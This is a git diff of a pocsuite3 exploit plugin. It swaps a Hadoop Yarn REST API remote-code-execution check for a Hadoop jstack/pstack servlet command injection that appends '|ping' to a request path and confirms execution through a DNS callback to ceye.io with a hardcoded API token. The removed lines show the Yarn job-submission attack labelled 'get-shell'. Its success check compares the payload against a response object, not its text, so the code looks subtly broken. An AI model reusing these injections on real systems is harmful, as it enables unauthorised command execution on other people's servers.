@@ -6,6 +6,8 @@ from pocsuite3.api import Output
 from pocsuite3.api import logger
 from pocsuite3.api import POCBase
 from pocsuite3.lib.utils import random_str
+from collections import OrderedDict
+from pocsuite3.api import OptString
 
 
 class Hadoop(POCBase):
@@ -16,42 +18,27 @@ class Hadoop(POCBase):
     createDate = '2019-11-14'
     updateDate = '2019-11-14'
     references = ['']
-    name = 'Hadoop Yarn REST API Remote Code Execution'
+    name = 'Hadoop jstack pstack Servlet Remote Code Execution'
     appPowerLink = ''
     appName = 'Hadoop'
-    appVersion = 'all'
+    appVersion = 'hadoop, hbase, hdfs 0.2'
     vulType = 'rce'
     desc = ''' 
-    Hadoop Yarn REST API Remote Code Execution
+    Hadoop jstack pstack Servlet Remote Code Execution
     '''
 
     def _verify(self):
         result = {}
         payload = random_str(16) + '.6eb4yw.ceye.io'
-        cmd = 'ping ' + payload
+        cmd = '|ping ' + payload
+        path = 'pstack?pid=123'
+        path2 = 'jstack?pid=123'
         try:
             if self.url[-1] == '/':
-                url1 = self.url + 'ws/v1/cluster/apps/new-application'
-                url2 = self.url + 'ws/v1/cluster/apps'
+                url = self.url + path + cmd
             else:
-                url1 = self.url + '/' + 'ws/v1/cluster/apps/new-application'
-                url2 = self.url + '/' + 'ws/v1/cluster/apps'
-            resp = requests.post(url=url1)
-            app_id = resp.json()['application-id']
-            data = {
-                'application-id': app_id,
-                'application-name': 'get-shell',
-                'am-container-spec': {
-                    'commands': {
-                        'command': '%s' % cmd,
-                    },
-                },
-                'application-type': 'YARN',
-            }
-            attack = requests.post(
-                url=url2,
-                json=data
-            )
+                url = self.url + '/' + path + cmd
+            attack = requests.get(url)
             res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
             if payload in res:
                 result['VerifyInfo'] = {}
